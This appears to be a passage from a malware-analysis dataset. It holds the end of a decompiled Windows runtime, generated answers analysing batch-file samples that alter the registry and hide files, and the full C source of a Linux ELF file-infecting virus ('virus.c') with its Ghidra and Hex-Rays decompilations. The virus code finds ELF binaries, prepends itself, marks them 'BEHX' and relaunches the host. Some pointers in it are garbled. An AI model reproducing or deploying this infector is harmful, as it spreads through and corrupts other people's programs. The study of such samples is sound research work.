memcpy(v9 + 280, Src, v8 - Src + 1);
v12 = sub_4038E0(v11, v10);
*(_DWORD *)(v10 + 272) = v12;
if ( v12 == (HANDLE)-1 )
{
Buffer = (char *)v10;
v10 = 0;
free(Buffer);
}
else
{
*(_DWORD *)(v10 + 276) = 0;
*(_DWORD *)v10 = 0;
*(_WORD *)(v10 + 4) = 272;
}
}
else
{
*_errno() = 12;
}
}
else
{
v10 = 0;
*_errno() = 2;
}
}
else
{
v10 = 0;
*_errno() = 22;
}
return v10;
}
// 403A60: using guessed type char Src[288];
//----- (00403C20) --------------------------------------------------------
BOOL __cdecl __mingw_readdir(int a1)
{
int v1; // eax
BOOL result; // eax
if ( a1 )
{
v1 = *(_DWORD *)(a1 + 276);
*(_DWORD )(a1 + 276) = v1 + 1;
if ( v1 <= 0 )
return a1;
result = sub_4039B0((void **)(a1 + 272), a1);
if ( result )
return a1;
}
else
{
*_errno() = 9;
return 0;
}
return result;
}
//----- (00403C70) --------------------------------------------------------
int __cdecl __mingw_closedir(HANDLE *Block)
{
if ( Block && FindClose(Block[68]) )
{
free(Block);
return 0;
}
else
{
*_errno() = 9;
return -1;
}
}
//----- (00403CC0) --------------------------------------------------------
_DWORD *__cdecl __mingw_rewinddir(int a1)
{
_DWORD result; // eax
if ( a1 && FindClose((HANDLE *)(a1 + 272)) )
{
result = sub_4038E0((const CHAR *)(a1 + 280), a1);
*(_DWORD *)(a1 + 272) = result;
if ( result != (_DWORD *)-1 )
*(_DWORD *)(a1 + 276) = 0;
}
else
{
result = _errno();
*result = 9;
}
return result;
}
//----- (00403D20) --------------------------------------------------------
int __cdecl __mingw_telldir(int a1)
{
if ( a1 )
return *(_DWORD *)(a1 + 276);
*_errno() = 9;
return -1;
}
//----- (00403D50) --------------------------------------------------------
int *__cdecl __mingw_seekdir(int a1, int a2)
{
int *result; // eax
if ( a2 < 0 )
{
result = _errno();
*result = 22;
}
else
{
result = __mingw_rewinddir(a1);
if ( a2 && *(_DWORD *)(a1 + 272) != -1 )
{
do
{
result = (int )((_DWORD *)(a1 + 276) + 1);
*(_DWORD *)(a1 + 276) = result;
if ( a2 <= (int)result )
break;
result = (int )sub_4039B0((void **)(a1 + 272), a1);
}
while ( result );
}
}
return result;
}
//----- (00403F80) --------------------------------------------------------
int register_frame_ctor()
{
return __gcc_register_frame();
}
// nfuncs=101 queued=45 decompiled=45 lumina nreq=0 worse=0 better=0
// ALL OK, 45 function(s) have been successfully decompiled","1. The primary functionality of the code is to modify system settings including changing the wallpaper and folder icons based on the availability of an internet connection. It differentiates between online and offline environments to apply changes and attempts to obfuscate its actions.

2. `onlineVersion()`: This function crafts and executes a batch file that changes system icons and wallpaper by downloading images from the internet and modifying registry settings.

   `offlineVersion()`: Similar to `onlineVersion()`, this function changes the wallpaper and system icons but uses local resources and alters the registry without requiring an internet connection.
   
   `GetVersion()`: A Windows API function used to retrieve the current Windows OS version information.

3. The variable `dwMajorVersion` is used to store the major version number of the Windows operating system. This value is then used to check if the OS version is Windows 8 or above, which determines the execution path of the program.

4. The error handling mechanism in the code checks if the file pointer `fp` is `NULL` after attempting to open a file. If it is `NULL`, it prints an error message and terminates the program with `exit(EXIT_FAILURE)`.

5. The flow of execution in `main()` retrieves the Windows version, checks if the version is 8 or higher, then attempts an internet connectivity test; if a connection is present, it runs `onlineVersion()`, otherwise, it runs `offlineVersion()`.

6. The external libraries or dependencies include:
   - `<stdio.h>` for file I/O operations and standard input/output functions.
   - `<stdlib.h>` for general utilities like `exit()`.
   - `<windows.h>` for Windows-specific functionalities including API calls.

7. Evident security concerns:
   - The code modifies registry settings that could potentially harm the stability of the system.
   - It downloads files from the internet without verifying their safety, which may introduce malware.
   - The hiding and deletion of files and registry keys suggest an attempt to avoid detection and could indicate malicious intent.
   - There is no user consent or notification of changes being made, leading to privacy issues.
   - There's a risk of privilege escalation if the program is run with administrative rights.
   - Use of hardcoded IP addresses and URLs indicates a lack of flexibility and potential unreliability.
   - Network connectivity check is done with a specific IP, which is not guaranteed to be reliable or safe.","1. The primary functionality of this code is to determine the operating system version. If specific criteria are met, it attempts to reach an external server. If successful, it executes the _onlineVersion() function; otherwise, it executes the _offlineVersion() function. Both functions create and execute a batch file ('mal.bat') which makes changes to the Windows Registry and file system.

2. Three key functions:
   - _GetVersion@0: Checks the Windows operating system version.
   - _system: Executes a specified command using the command processor (cmd.exe).
   - _fwrite: Writes data to the provided file stream.

3. The variable _File represents a FILE pointer used to interact with 'mal.bat'. It is used for writing data to this file and is essential for directing the subsequent behavior of the malware.

4. The error handling mechanism involves checking if the file pointer (_File) is null after attempting to open 'mal.bat'. If null, it signifies a failure to open the file for writing, and the program prints an error message using _puts and _printf, retrieves the error number with __errno, translates it using _strerror, and then exits the program with an error code using _exit.

5. In the _onlineVersion() function, the flow starts with opening 'mal.bat'. If it fails, an error is printed and the program exits. If successful, various Windows Registry modification commands and file changes are written to 'mal.bat'. The file is then executed, and the new files created are hidden before 'mal.bat' is deleted.

6. The code relies on several standard C libraries, such as stdio.h (for file operations like _fopen), stdlib.h (for the _system and _exit functions), and possibly string.h (for functions like _strerror). It also assumes the presence of the file 'mal.bat' and internet connectivity for pinging an external server.

7. Evident security concerns include:
   - Running shell commands and batch files which could execute arbitrary and potentially harmful actions.
   - Writing directly to the Windows Registry, which requires administrative privileges and could disrupt system operations or hide file presence.
   - No checks on command injection or file path manipulation‚Äîserious security risks.
   - The code's attempt to ping an external server suggests potential for external communication or command & control functionality.
   - The explicit intention to hide files and registry modifications hints at malware-like behavior.","1. The primary functionality of the code is related to file operations and execution flow handling in a C/C++ program running on Windows. It includes functions for initializing the runtime environment, handling exceptions and signals, file I/O operations, string manipulation, dynamic memory allocation, and interacting with the operating system (OS) like creating directories, process management etc.

2. Three key functions:
   - `mainCRTStartup()`: This function sets up the runtime environment before calling the main function.
   - `TopLevelExceptionFilter()`: This function acts as a filter for unhandled exceptions, potentially converting them to signals.
   - `sub_4011B0()`: It's responsible for initializing the main arguments and registering exception filters before executing the main program entry function.

3. The `CTOR_LIST` variable is an array storing constructors for static objects. These constructors are called before `main()` is executed to properly set up static objects that require dynamic initialization.

4. The error handling mechanism uses Windows Structured Exception Handling (SEH) for managing exceptions and signals. The `TopLevelExceptionFilter()` function handles these exceptions, converting them to signals if appropriate and performing necessary cleanup or program termination.

5. The flow of execution in `mainCRTStartup()` starts with setting application type, calling `sub_4011B0()` to initialize main program arguments and set exception filters, finalizing initialization, and then transferring control to the main function of the user program.

6. External libraries/dependencies:
   - Standard C Library (libc) for standard functionalities like string manipulation, file I/O, etc.
   - Windows API for system-level interactions, for example, creating and managing directories, files, and processes.
   - GCC-related libraries for frame registration and exception handling, like libgcc.

7. Security concerns:
   - The code utilizes low-level memory manipulation and system calls which can be prone to buffer overflows or incorrect memory handling if not used cautiously.
   - Signals and exceptions are handled globally which could lead to unexpected behavior if not correctly configured.
   - The `mainCRTStartup()` function is marked as `__noreturn`, implying that the function should not return; however, incorrect implementation might lead to unintended returns and undefined behavior."
15,https://github.com/sa-akhavani/tmp/blob/master/virus.c,Done,Linux,"#include <stdlib.h>
#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <errno.h>
long get_binary_file_length(char* file_name)
{
long file_length;
FILE *fp = fopen(file_name, ""rb"");
if (fp)
{
fseek(fp, 0, SEEK_END);
file_length = ftell(fp);
fseek(fp, 0, SEEK_SET);
}
fclose(fp);
return file_length;
}
// The first four bytes of elf files are {0x7f, 'E', 'L', 'F'}
int is_elf(char *file_name)
{
FILE *fp = fopen(file_name, ""rb"");
if (fp)
{
char buff[4];
for (int i = 0; i < 4; i++)
buff[i] = fgetc(fp);
fclose(fp);
if (buff[0] == 0x7f && buff[1] == 'E' && buff[2] == 'L' && buff[3] == 'F')
return 1;
}
return 0;
}
int is_infected(char *file_name, char *signature, int signature_length)
{
char buff[signature_length + 1];
FILE *fp = fopen(file_name, ""rb"");
if (fp)
{
fseek(fp, (-1 * signature_length), SEEK_END);
for (int i = 0; i < signature_length; i++)
buff[i] = fgetc(fp);
buff[signature_length] = '\0';
fclose(fp);
if (!strcmp(buff, signature))
return 1;
else
return 0;
}
return 0;
}
// Don't try to infect the virus itself :D
int is_origin_virus(char *file_name)
{
if (!strcmp(file_name, ""virus"") || !strcmp(file_name, ""./virus""))
return 1;
return 0;
}
char *find_target(char signature, int signature_length)
{
struct dirent dent;
DIR dir = opendir(""."");
if (dir == NULL)
return NULL;
else
{
while ((dent = readdir(dir)) != NULL)
{
char file_name_ptr = dent->d_name;
char file_name = (char) malloc(sizeof(char) * (strlen(file_name_ptr) + 1));
strcpy(file_name, file_name_ptr);
if (!strcmp(file_name, ""."") || !strcmp(file_name, ""..""))
continue;
else
{
if (!is_infected(file_name, signature, signature_length) && is_elf(file_name) && !is_origin_virus(file_name))
{
closedir(dir);
return file_name;
}
}
}
closedir(dir);
return NULL;
}
}
void execute_payload()
{
printf(""Hello! I am a simple virus!\n"");
}
// Mark the binary file so the virus can later recognize that this file is already infected
void mark_victim(char *file_name, char signature)
{
FILE fp = fopen(file_name, ""ab"");
for (int i = 0; i < strlen(signature); i++)
fputc(signature[i], fp);
fclose(fp);
}
int infect(char victim_file_name, char virus_binary_file_name, long virus_length)
{
long victim_length = get_binary_file_length(victim_file_name);
long cnt = 0;
int final_binary[virus_length + victim_length];
FILE virus_fp = fopen(virus_binary_file_name, ""rb"");
for (; cnt < virus_length; cnt++)
final_binary[cnt] = fgetc(virus_fp);
fclose(virus_fp);
FILE victim_fp = fopen(victim_file_name, ""rb"");
for (; cnt < victim_length + virus_length; cnt++)
final_binary[cnt] = fgetc(victim_fp);
fclose(victim_fp);
FILE new_fp = fopen(victim_file_name, ""wb"");
if (new_fp)
{
for (long i = 0; i < virus_length + victim_length; i++)
fputc(final_binary[i], new_fp);
fclose(new_fp);
return 1;
}
else
return 0;
}
void extract_main_elf_from_virus(char bin_file_name, char tmp_file_name, long virus_length, long signature_length)
{
long binary_length = get_binary_file_length(bin_file_name);
FILE fp = fopen(bin_file_name, ""rb"");
FILE tmp_fp = fopen(tmp_file_name, ""wb"");
fseek(fp, virus_length, SEEK_SET);
for (long i = 0; i < binary_length - virus_length - signature_length; i++)
fputc(fgetc(fp), tmp_fp);
fclose(fp);
fclose(tmp_fp);
//Set file permission to executable
char mode[] = ""0755"";
int i = strtol(mode, 0, 8);
if (chmod(tmp_file_name, i) < 0)
printf(""error in chmod() - %d (%s)\n"", errno, strerror(errno));
}
void execute_main_elf(char file_name, char argv[], char tmp_file_name, long virus_length, long signature_length)
{
extract_main_elf_from_virus(file_name, tmp_file_name, virus_length, signature_length);
pid_t pid = fork();
if (pid == 0)
{
if (execv(tmp_file_name, argv) < 0)
perror(""execv"");
}
else
{
waitpid(pid, NULL, 0);
remove(tmp_file_name);
}
}
int main(int argc, char argv[])
{
char signature = ""BEHX"";
char tmp_file_name = ""/tmp/behx"";
char binary_file_name = argv[0];
// Check this everytime you change the code!
long virus_size = 13912;
execute_payload();
char victim_file_name = find_target(signature, strlen(signature));
if (victim_file_name)
{
int success = infect(victim_file_name, binary_file_name, virus_size);
if (success)
mark_victim(victim_file_name, signature);
}
if (!is_origin_virus(binary_file_name))
execute_main_elf(binary_file_name, argv, tmp_file_name, virus_size, strlen(signature));
return 0;
}","{
""functions"": [
""get_binary_file_length"",
""is_elf"",
""is_infected"",
""is_origin_virus"",
""find_target"",
""execute_payload"",
""mark_victim"",
""infect"",
""extract_main_elf_from_virus"",
""execute_main_elf"",
""main""
]
}","{
""variables"": [
""file_length"",
""fp"",
""buff"",
""file_name_ptr"",
""file_name"",
""dent"",
""dir"",
""cnt"",
""final_binary"",
""virus_fp"",
""victim_length"",
""victim_fp"",
""new_fp"",
""binary_length"",
""mode"",
""i"",
""signature"",
""tmp_file_name"",
""binary_file_name"",
""virus_size"",
""victim_file_name"",
""success"",
""tmp_fp"",
""pid""
]
}","// The first four bytes of elf files are {0x7f, 'E', 'L', 'F'}
// Don't try to infect the virus itself :D
// Mark the binary file so the virus can later recognize that this file is already infected","int execute_payload(void);
int puts(char *__s);
undefined8 infect(char *param_1,char *param_2,long param_3);
int fgetc(FILE *__stream);
int fputc(int __c,FILE *__stream);
long get_binary_file_length(char *param_1);
long ftell(FILE *__stream);
int fseek(FILE *__stream,long __off,int __whence);
char * find_target(char *param_1,int param_2);
undefined8 is_infected(char *param_1,char *param_2,int param_3);
int strcmp(char *__s1,char *__s2);
DIR * opendir(char *__name);
void * malloc(size_t __size);
undefined8 is_origin_virus(char *param_1);
undefined8 is_elf(char *param_1);
int closedir(DIR *__dirp);
dirent * readdir(DIR *__dirp);
char * strcpy(char *__dest,char *__src);
void execute_main_elf(char *param_1,char **param_2,char *param_3,long param_4,long param_5);
__pid_t fork(void);
int remove(char *__filename);
void perror(char *__s);
__pid_t waitpid(__pid_t __pid,int *__stat_loc,int __options);
ulong extract_main_elf_from_virus(char *param_1,char *param_2,long param_3,long param_4);
char * strerror(int __errnum);
long strtol(char *__nptr,char **__endptr,int __base);
int chmod(char *__file,__mode_t __mode);
int execv(char *__path,char **__argv);
int mark_victim(char *param_1,char *param_2);
undefined8 main(undefined8 param_1,char **param_2)
{
char *pcVar1;
size_t sVar2;
char *pcVar3;
undefined8 uVar4;
pcVar1 = *param_2;
execute_payload();
sVar2 = strlen(""BEHX"");
pcVar3 = find_target(""BEHX"",(int)sVar2);
if (pcVar3 != (char *)0x0) {
uVar4 = infect(pcVar3,pcVar1,0x3658);
if ((int)uVar4 != 0) {
mark_victim(pcVar3,""BEHX"");
}
}
uVar4 = is_origin_virus(pcVar1);
if ((int)uVar4 == 0) {
sVar2 = strlen(""BEHX"");
execute_main_elf(pcVar1,param_2,""/tmp/behx"",0x3658,sVar2);
}
return 0;
}
undefined8 infect(char *param_1,char *param_2,long param_3)
{
ulong uVar1;
long lVar2;
undefined *puVar3;
int iVar4;
FILE *pFVar5;
undefined8 uVar6;
undefined auStack_e0 [16];
long local_68;
char *local_60;
char *local_58;
long local_48;
long local_40;
long local_38;
long local_8;
local_8 = ___stack_chk_guard;
local_38 = get_binary_file_length(param_1);
local_48 = 0;
uVar1 = (param_3 + local_38) * 4 + 0xf;
for (puVar3 = auStack_e0; puVar3 != auStack_e0 + -(uVar1 & 0xffffffffffff0000);
puVar3 = puVar3 + -0x10000) {
*(undefined8 *)(puVar3 + -0xfc00) = 0;
}
lVar2 = -(uVar1 & 0xfff0);
local_68 = param_3;
local_60 = param_2;
local_58 = param_1;
*(undefined8 *)(puVar3 + lVar2) = 0;
if (0x3ff < (uVar1 & 0xfff0)) {
*(undefined8 *)(puVar3 + lVar2 + 0x400) = 0;
}
lVar2 = lVar2 + 0x10;
pFVar5 = fopen(local_60,""rb"");
for (; local_48 < local_68; local_48 = local_48 + 1) {
iVar4 = fgetc(pFVar5);
*(int *)(puVar3 + local_48 * 4 + lVar2) = iVar4;
}
fclose(pFVar5);
pFVar5 = fopen(local_58,""rb"");
for (; local_48 < local_38 + local_68; local_48 = local_48 + 1) {
iVar4 = fgetc(pFVar5);
*(int *)(puVar3 + local_48 * 4 + lVar2) = iVar4;
}
fclose(pFVar5);
pFVar5 = fopen(local_58,""wb"");
if (pFVar5 == (FILE )0x0) {
uVar6 = 0;
}
else {
for (local_40 = 0; local_40 < local_68 + local_38; local_40 = local_40 + 1) {
fputc((int )(puVar3 + local_40 * 4 + lVar2),pFVar5);
}
fclose(pFVar5);
uVar6 = 1;
}
if (local_8 - ___stack_chk_guard != 0) {
/ WARNING: Subroutine does not return */
__stack_chk_fail(&__stack_chk_guard,uVar6,0,local_8 - ___stack_chk_guard);
}
return uVar6;
}

char * find_target(char *param_1,int param_2)
{
int iVar1;
DIR *__dirp;
char *__dest;
size_t sVar2;
undefined8 uVar3;
dirent *pdVar4;
__dirp = opendir(""."");
if (__dirp == (DIR *)0x0) {
__dest = (char *)0x0;
}
else {
do {
pdVar4 = readdir(__dirp);
if (pdVar4 == (dirent *)0x0) {
closedir(__dirp);
return (char *)0x0;
}
sVar2 = strlen(pdVar4->d_name);
__dest = (char *)malloc(sVar2 + 1);
strcpy(__dest,pdVar4->d_name);
iVar1 = strcmp(__dest,""."");
} while ((((iVar1 == 0) || (iVar1 = strcmp(__dest,""..""), iVar1 == 0)) ||
(uVar3 = is_infected(__dest,param_1,param_2), (int)uVar3 != 0)) ||
((uVar3 = is_elf(__dest), (int)uVar3 == 0 ||
(uVar3 = is_origin_virus(__dest), (int)uVar3 != 0))));
closedir(__dirp);
}
return __dest;
}
undefined8 is_infected(char *param_1,char *param_2,int param_3)
{
ulong uVar1;
char *__s1;
long lVar2;
undefined *puVar3;
int iVar4;
FILE *__stream;
undefined8 uVar5;
undefined auStack_80 [16];
int local_44;
char *local_40;
char *local_38;
int local_24;
long local_8;
local_8 = ___stack_chk_guard;
uVar1 = (long)(param_3 + 1) + 0xf;
for (puVar3 = auStack_80; puVar3 != auStack_80 + -(uVar1 & 0xffffffffffff0000);
puVar3 = puVar3 + -0x10000) {
*(undefined8 *)(puVar3 + -0xfc00) = 0;
}
lVar2 = -(uVar1 & 0xfff0);
local_44 = param_3;
local_40 = param_2;
local_38 = param_1;
*(undefined8 *)(puVar3 + lVar2) = 0;
if (0x3ff < (uVar1 & 0xfff0)) {
*(undefined8 *)(puVar3 + lVar2 + 0x400) = 0;
}
__s1 = puVar3 + lVar2 + 0x10;
__stream = fopen(local_38,""rb"");
if (__stream == (FILE )0x0) {
uVar5 = 0;
}
else {
fseek(__stream,(long)-local_44,2);
for (local_24 = 0; local_24 < local_44; local_24 = local_24 + 1) {
iVar4 = fgetc(__stream);
__s1[local_24] = (char)iVar4;
}
__s1[local_44] = '\0';
fclose(__stream);
iVar4 = strcmp(__s1,local_40);
if (iVar4 == 0) {
uVar5 = 1;
}
else {
uVar5 = 0;
}
}
if (local_8 - ___stack_chk_guard != 0) {
/ WARNING: Subroutine does not return */
__stack_chk_fail(&__stack_chk_guard,uVar5,0,local_8 - ___stack_chk_guard);
}
return uVar5;
}

undefined8 is_elf(char *param_1)
{
int iVar1;
FILE *__stream;
undefined8 uVar2;
int local_1c;
char local_10 [8];
long local_8;
local_8 = ___stack_chk_guard;
__stream = fopen(param_1,""rb"");
if (__stream != (FILE )0x0) {
for (local_1c = 0; local_1c < 4; local_1c = local_1c + 1) {
iVar1 = fgetc(__stream);
local_10[local_1c] = (char)iVar1;
}
fclose(__stream);
if ((((local_10[0] == '\x7f') && (local_10[1] == 'E')) && (local_10[2] == 'L')) &&
(local_10[3] == 'F')) {
uVar2 = 1;
goto LAB_00100ffc;
}
}
uVar2 = 0;
LAB_00100ffc:
if (local_8 - ___stack_chk_guard != 0) {
/ WARNING: Subroutine does not return */
__stack_chk_fail(&__stack_chk_guard,uVar2,0,local_8 - ___stack_chk_guard);
}
return uVar2;
}

ulong extract_main_elf_from_virus(char *param_1,char *param_2,long param_3,long param_4)
{
uint uVar1;
int iVar2;
long lVar3;
FILE *__stream;
FILE *__stream_00;
ulong uVar4;
uint *puVar5;
int *piVar6;
char *pcVar7;
ulong uVar8;
long local_30;
undefined4 local_10;
undefined local_c;
long local_8;
local_8 = ___stack_chk_guard;
lVar3 = get_binary_file_length(param_1);
__stream = fopen(param_1,""rb"");
__stream_00 = fopen(param_2,""wb"");
fseek(__stream,param_3,0);
for (local_30 = 0; local_30 < (lVar3 - param_3) - param_4; local_30 = local_30 + 1) {
iVar2 = fgetc(__stream);
fputc(iVar2,__stream_00);
}
fclose(__stream);
fclose(__stream_00);
local_10 = 0x35353730;
local_c = 0;
uVar4 = strtol((char *)&local_10,(char **)0x0,8);
uVar8 = uVar4 & 0xffffffff;
iVar2 = chmod(param_2,(__mode_t)uVar4);
if (iVar2 < 0) {
puVar5 = (uint *)__errno_location();
uVar1 = *puVar5;
piVar6 = __errno_location();
pcVar7 = strerror(piVar6);
uVar8 = (ulong)uVar1;
printf(""error in chmod() - %d (%s)\n"",uVar8,pcVar7);
}
if (local_8 != ___stack_chk_guard) {
/ WARNING: Subroutine does not return */
__stack_chk_fail();
}
return uVar8;
}

int mark_victim(char *param_1,char *param_2)
{
int iVar1;
FILE *__stream;
size_t sVar2;
int local_c;
__stream = fopen(param_1,""ab"");
for (local_c = 0; sVar2 = strlen(param_2), (ulong)(long)local_c < sVar2; local_c = local_c + 1) {
fputc((uint)(byte)param_2[local_c],__stream);
}
iVar1 = fclose(__stream);
return iVar1;
}","/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
Copyright (c) 2007-2021 Hex-Rays mailto:info@hex-rays.com
Detected compiler: GNU C++
*/
#include <defs.h>
//-------------------------------------------------------------------------
// Function declarations
void *init_proc();
void sub_BC0();
// size_t strlen(const char *s);
// int __fastcall __libc_start_main(int (__fastcall *main)(int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void *stack_end);
// void perror(const char *s);
// int remove(const char *filename);
// __int64 ftell(FILE *stream);
// int __fastcall __cxa_finalize(void *);
// DIR *opendir(const char *name);
// int fputc(int c, FILE *stream);
// __pid_t fork(void);
// int fclose(FILE *stream);
// FILE *fopen(const char *filename, const char *modes);
// void *malloc(size_t size);
// int chmod(const char *file, __mode_t mode);
// int fgetc(FILE *stream);
// int execv(const char *path, char *const argv[]);
// struct dirent *readdir(DIR *dirp);
// int closedir(DIR *dirp);
// char *strerror(int errnum);
// __int64 gmon_start(void); weak
// int fseek(FILE *stream, __int64 off, int whence);
// void __noreturn abort(void);
// int puts(const char *s);
// int strcmp(const char *s1, const char *s2);
// __int64 strtol(const char *nptr, char **endptr, int base);
// char *strcpy(char *dest, const char *src);
// int printf(const char *format, ...);
// int *__errno_location(void);
// __pid_t waitpid(__pid_t pid, int *stat_loc, int options);
void __fastcall __noreturn start(void (*rtld_fini)(void), int a2, int a3, int a4, int a5, int a6, int a7, int a8, int argc, char *ubp_av); // idb
void *call_weak_fn();
char *deregister_tm_clones();
char *register_tm_clones();
__int64 _do_global_dtors_aux();
__int64 __fastcall get_binary_file_length(const char *a1);
__int64 __fastcall is_elf(const char *a1);
__int64 __fastcall is_infected(char *a1, char *a2, int a3);
bool __fastcall is_origin_virus(const char *a1);
char *__fastcall find_target(char *a1, int a2);
__int64 execute_payload();
__int64 __fastcall mark_victim(const char *a1, const char *a2);
__int64 __fastcall infect(char *a1, char *a2, __int64 a3);
__int64 __fastcall extract_main_elf_from_virus(const char *a1, const char *a2, __int64 a3, __int64 a4);
void __fastcall execute_main_elf(const char *a1, char *const *a2, const char *a3, __int64 a4, __int64 a5);
int __fastcall main(int argc, const char **argv, const char **envp);
void term_proc();
// int __fastcall _cxa_finalize(void *);
// __int64 ITM_deregisterTMCloneTable(void); weak
// __int64 ITM_registerTMCloneTable(void); weak
//-------------------------------------------------------------------------
// Data declarations
void *_dso_handle = &_dso_handle; // weak
char _bss_start; // weak
// extern UNKNOWN gmon_start; weak
//----- (0000000000000BA0) ----------------------------------------------------
void *init_proc()
{
return call_weak_fn();
}
//----- (0000000000000BC0) ----------------------------------------------------
void sub_BC0()
{
JUMPOUT(0LL);
}
// BD0: control flows out of bounds to 0
//----- (0000000000000DC0) ----------------------------------------------------
void __fastcall __noreturn start(
void (*rtld_fini)(void),
int a2,
int a3,
int a4,
int a5,
int a6,
int a7,
int a8,
int argc,
char *ubp_av)
{
__libc_start_main((int (fastcall *)(int, char **, char **))main, argc, &ubp_av, 0LL, 0LL, rtld_fini, &argc);
abort();
}
//----- (0000000000000DF4) ----------------------------------------------------
void *call_weak_fn()
{
void *result; // x0
result = &gmon_start;
if ( &gmon_start )
return (void *)gmon_start();
return result;
}
// D10: using guessed type __int64 gmon_start(void);
//----- (0000000000000E10) ----------------------------------------------------
char *deregister_tm_clones()
{
return &_bss_start;
}
// 12010: using guessed type char _bss_start;
// 12150: using guessed type __int64 ITM_deregisterTMCloneTable(void);
//----- (0000000000000E40) ----------------------------------------------------
char *register_tm_clones()
{
return &_bss_start;
}
// 12010: using guessed type char _bss_start;
// 12160: using guessed type __int64 ITM_registerTMCloneTable(void);
//----- (0000000000000E80) ----------------------------------------------------
__int64 _do_global_dtors_aux()
{
__int64 result; // x0
result = (unsigned __int8)_bss_start;
if ( !_bss_start )
{
if ( &_cxa_finalize )
__cxa_finalize(_dso_handle);
deregister_tm_clones();
result = 1LL;
_bss_start = 1;
}
return result;
}
// 12008: using guessed type void *_dso_handle;
// 12010: using guessed type char _bss_start;
//----- (0000000000000ED4) ----------------------------------------------------
__int64 __fastcall get_binary_file_length(const char *a1)
{
__int64 v2; // [xsp+20h] [xbp+20h]
FILE *stream; // [xsp+28h] [xbp+28h]
stream = fopen(a1, ""rb"");
if ( stream )
{
fseek(stream, 0LL, 2);
v2 = ftell(stream);
fseek(stream, 0LL, 0);
}
fclose(stream);
return v2;
}
// F34: variable 'v2' is possibly undefined
//----- (0000000000000F40) ----------------------------------------------------
__int64 __fastcall is_elf(const char *a1)
{
__int64 result; // x0
int i; // [xsp+24h] [xbp+24h]
FILE *stream; // [xsp+28h] [xbp+28h]
char v4[8]; // [xsp+30h] [xbp+30h]
stream = fopen(a1, ""rb"");
if ( !stream )
goto LABEL_10;
for ( i = 0; i <= 3; v4[i++] = fgetc(stream) )
;
fclose(stream);
if ( v4[0] == 127 && v4[1] == 69 && v4[2] == 76 && v4[3] == 70 )
LODWORD(result) = 1;
else
LABEL_10:
LODWORD(result) = 0;
return (unsigned int)result;
}
//----- (000000000000102C) ----------------------------------------------------
__int64 __fastcall is_infected(char *a1, char *a2, int a3)
{
char v3; // w0
__int64 result; // x0
char v5; // [xsp+10h] [xbp-10000h] BYREF
__int64 v6; // [xsp+400h] [xbp-FC10h]
_BYTE v7[16]; // [xsp+10000h] [xbp-10h] BYREF
int v8; // [xsp+1003Ch] [xbp+2Ch]
char *s2; // [xsp+10040h] [xbp+30h]
char *filename; // [xsp+10048h] [xbp+38h]
int i; // [xsp+1005Ch] [xbp+4Ch]
__int64 v12; // [xsp+10060h] [xbp+50h]
char *s1; // [xsp+10068h] [xbp+58h]
FILE *stream; // [xsp+10070h] [xbp+60h]
filename = a1;
s2 = a2;
v8 = a3;
v12 = a3 + 1 - 1LL;
while ( v7 != &v7[-((16 * ((unsigned __int64)(a3 + 1 + 15LL) >> 4)) & 0xFFFFFFFFFFFF0000LL)] )
v6 = 0LL;
if ( (unsigned __int16)(16 * ((unsigned __int64)(a3 + 1 + 15LL) >> 4)) >= 0x400uLL )
v6 = 0LL;
s1 = &v5;
stream = fopen(filename, ""rb"");
if ( stream )
{
fseek(stream, -v8, 2);
for ( i = 0; i < v8; ++i )
{
v3 = fgetc(stream);
s1[i] = v3;
}
s1[v8] = 0;
fclose(stream);
LODWORD(result) = strcmp(s1, s2) == 0;
}
else
{
LODWORD(result) = 0;
}
return (unsigned int)result;
}
//----- (00000000000011F4) ----------------------------------------------------
bool __fastcall is_origin_virus(const char *a1)
{
return !strcmp(a1, ""virus"") || !strcmp(a1, ""./virus"");
}
//----- (0000000000001244) ----------------------------------------------------
char *__fastcall find_target(char *a1, int a2)
{
size_t v3; // x0
DIR *dirp; // [xsp+20h] [xbp+20h]
struct dirent *v7; // [xsp+28h] [xbp+28h]
char *dest; // [xsp+38h] [xbp+38h]
dirp = opendir(""."");
if ( !dirp )
return 0LL;
while ( 1 )
{
v7 = readdir(dirp);
if ( !v7 )
break;
v3 = strlen(v7->d_name);
dest = (char *)malloc(v3 + 1);
strcpy(dest, v7->d_name);
if ( strcmp(dest, ""."")
&& strcmp(dest, "".."")
&& !(unsigned int)is_infected(dest, a1, a2)
&& (unsigned int)is_elf(dest)
&& !is_origin_virus(dest) )
{
closedir(dirp);
return dest;
}
}
closedir(dirp);
return 0LL;
}
//----- (000000000000134C) ----------------------------------------------------
__int64 execute_payload()
{
return puts(""Hello! I am a simple virus!"");
}
//----- (000000000000136C) ----------------------------------------------------
__int64 __fastcall mark_victim(const char *a1, const char *a2)
{
int i; // [xsp+34h] [xbp+34h]
FILE *stream; // [xsp+38h] [xbp+38h]
stream = fopen(a1, ""ab"");
for ( i = 0; i < strlen(a2); ++i )
fputc((unsigned __int8)a2[i], stream);
return fclose(stream);
}
//----- (00000000000013EC) ----------------------------------------------------
__int64 __fastcall infect(char *a1, char *a2, __int64 a3)
{
int v3; // w0
int v4; // w0
__int64 result; // x0
char v6; // [xsp+10h] [xbp-10000h] BYREF
__int64 v7; // [xsp+400h] [xbp-FC10h]
_BYTE v8[16]; // [xsp+10000h] [xbp-10h] BYREF
__int64 v9; // [xsp+10078h] [xbp+68h]
char *filename; // [xsp+10080h] [xbp+70h]
char *v11; // [xsp+10088h] [xbp+78h]
__int64 v12; // [xsp+10098h] [xbp+88h]
__int64 i; // [xsp+100A0h] [xbp+90h]
__int64 binary_file_length; // [xsp+100A8h] [xbp+98h]
__int64 v15; // [xsp+100B0h] [xbp+A0h]
char *v16; // [xsp+100B8h] [xbp+A8h]
FILE *stream; // [xsp+100C0h] [xbp+B0h]
FILE *v18; // [xsp+100C8h] [xbp+B8h]
FILE *v19; // [xsp+100D0h] [xbp+C0h]
v11 = a1;
filename = a2;
v9 = a3;
binary_file_length = get_binary_file_length(a1);
v12 = 0LL;
v15 = v9 + binary_file_length - 1;
while ( v8 != &v8[-((16 * ((unsigned __int64)(4 * (v9 + binary_file_length) + 15) >> 4)) & 0xFFFFFFFFFFFF0000LL)] )
v7 = 0LL;
if ( (unsigned __int16)(16 * ((unsigned __int64)(4 * (v9 + binary_file_length) + 15) >> 4)) >= 0x400uLL )
v7 = 0LL;
v16 = &v6;
stream = fopen(filename, ""rb"");
while ( v12 < v9 )
{
